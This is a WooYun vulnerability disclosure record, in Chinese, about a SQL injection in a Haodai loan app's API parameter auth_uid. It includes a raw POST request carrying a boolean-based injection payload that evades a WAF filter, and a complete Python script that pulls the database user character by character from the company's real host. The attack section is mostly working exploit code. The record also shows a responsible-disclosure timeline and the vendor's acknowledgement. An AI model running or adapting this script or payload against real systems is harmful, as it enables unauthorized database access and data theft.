{"id": 65451, "wybug_id": "wooyun-2015-0133907", "wybug_title": "好贷网某APP存在SQL注入（过waf附脚本）", "wybug_corp": "好贷网", "wybug_author": "深度安全实验室", "wybug_date": "2015-08-13 16:57", "wybug_open_date": "2015-10-01 20:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： 好贷网某APP存在SQL注入（过waf附脚本） 详细说明：  http://www.haodai.com/h5/hdb/index.html   信贷圈APP登陆该APP后，填写产品基本资料页面存在注入\n\n\nPOST /bapi/OrderQueue/getOrderNum HTTP/1.1Charset: UTF-8Content-Type: application/x-www-form-urlencodedContent-Length: 210Host: interface.api.haodai.comConnection: Keep-AliveCookie: PHPSESSID=33nanoc9k2cqva9vq627uhlpe1Cookie2: $Version=1os_type=1&appid=1&imei=860556000377226&app_version=26500&auth_tms=20150813152229&auth_did=51719&auth_dsig=123ceeedcab4611a&auth_uid=216444 and GREATEST(1,length(user()))=23&auth_usig=fb02a38fe6175824&xid=216444\nauth_uid参数，过滤了>符号为真时，返回1000，得到user长度为23\n\n为假时返回9022：\n\n写个脚本跑跑：\n\n附脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')print 'Start to retrive MySQL User:\\n'user = ''for i in range(1, 24):    for payload in payloads:        print '.',        conn = httplib.HTTPConnection('interface.api.haodai.com', timeout=60)\t\t        s = 'auth_uid=216444 and GREATEST(1,ascii(mid(user()from(%s)for(1))))=%s' % (i, ord(payload))                conn.request(method='POST',                     url='/bapi/OrderQueue/getOrderNum',                     body='os_type=1&appid=1&imei=860556000377226&app_version=26500&auth_tms=20150813152229&auth_did=51719&auth_dsig=123ceeedcab4611a&auth_usig=fb02a38fe6175824&xid=216444&' + s,                     headers=headers)        html_doc = conn.getresponse().read().decode('utf-8')        conn.close()        #print html_doc                if html_doc.find(u'1000') > 0:            user += payload            sys.stdout.write('\\r[In Progress]' + user)            sys.stdout.flush()            breakprint '[Done]MySQL user is %s' % user\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 深度安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-17 20:08 厂商回复： 多谢  我们尽快修改  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-13 17:36 |    \t\t不良小狼 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        | 路人乙)\t\t \n  http://www.firstp2p.com/hongbao/CashBind?cn=FH5U5F    \n     2015-08-13 17:41 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:25        | 安全是什么...)\t\t \n  如何过waf    \n     2015-08-13 20:00 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:63        | 工作需要，暂别一段时间)\t\t \n  6666666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}